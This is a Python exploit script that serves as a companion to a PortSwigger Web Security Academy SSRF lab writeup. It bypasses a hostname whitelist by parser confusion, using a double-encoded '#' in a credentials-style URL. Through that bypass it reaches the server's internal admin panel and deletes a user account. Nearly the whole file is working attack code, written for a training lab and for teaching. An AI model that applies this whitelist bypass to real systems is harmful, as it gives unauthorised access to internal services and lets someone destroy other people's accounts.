#!/usr/bin/env python3
"""
SSRF with whitelist-based input filter
PortSwigger Web Security Academy -- Server-Side Request Forgery (SSRF)

Companion script for the writeup: 06-ssrf-whitelist-based-input-filter.md

What this does:
    Exploits a whitelist that checks the hostname after "@" (embedded
    credentials) but disagrees with the HTTP client about what a URL-encoded
    "#" resolves to. localhost%23@stock.weliketoshop.net reads, to the
    whitelist's parser, as userinfo="localhost%23" / host="stock.weliketoshop.net"
    (passes); the HTTP client that actually fetches the URL decodes %23 to a
    literal "#" first, turning everything from there on into a discarded
    fragment, and routes the request to localhost instead.

    ENCODING NOTE: httpx's data={} form-encodes values, adding one URL-encode
    layer. To land on the wire as %2523 (what the whitelist's parser needs to
    decode once and still see "localhost%23@stock.weliketoshop.net"), we write
    only %23 in the Python source -- NOT %2523 -- and let httpx add the second
    layer automatically.

Usage:
    python 06-ssrf-whitelist-based-input-filter.py <lab-url>
    e.g. python 06-ssrf-whitelist-based-input-filter.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

WHITELISTED_HOST = "stock.weliketoshop.net"


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    stock_url = f"{lab_url}/product/stock"

    # userinfo=localhost%23 (single-encoded -- see ENCODING NOTE above), host=WHITELISTED_HOST.
    bypass_url = f"http://localhost%23@{WHITELISTED_HOST}/admin"
    r = client.post(stock_url, data={"stockApi": bypass_url})
    print(f"[*] stockApi={bypass_url} -> status={r.status_code}, len={len(r.text)}")

    if not (r.status_code == 200 and len(r.text) > 200):
        print("[-] Whitelist bypass failed on the primary payload.")
        print(f"[-] Response preview: {r.text[:300]}")
        return

    delete_match = re.search(r'href="(/admin/delete\?username=carlos)"', r.text)
    if not delete_match:
        print("[-] Delete link not found in admin page.")
        return

    delete_path = delete_match.group(1)
    print(f"[*] Found delete link: {delete_path}")

    delete_bypass_url = f"http://localhost%23@{WHITELISTED_HOST}{delete_path}"
    print(f"[*] Deleting carlos via: {delete_bypass_url}")

    r2 = client.post(stock_url, data={"stockApi": delete_bypass_url})
    print(f"[*] stockApi={delete_bypass_url} -> status={r2.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- carlos deleted via whitelist parser-confusion bypass.")
    else:
        print("[-] Not solved yet -- check the delete response above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
